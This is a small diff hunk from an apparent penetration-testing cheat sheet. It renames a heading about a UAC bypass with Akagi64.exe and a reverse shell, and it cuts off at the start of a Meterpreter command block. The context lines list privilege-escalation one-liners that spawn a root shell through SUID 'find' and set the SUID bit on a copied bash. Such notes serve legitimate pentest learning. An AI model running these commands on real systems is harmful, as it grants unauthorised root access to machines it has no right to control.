@@ -287,7 +287,7 @@ exploit
 | Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
 | Make binary SUID | `chmod u+s /tmp/bash` |
 
-### 🪟 PrivEsc via Akagi64.exe + Reverse Shell
+### Privilege Escalation via Akagi64.exe (UAC Bypass) with Reverse Shell
 
 ```bash
 # After gaining initial Meterpreter session:
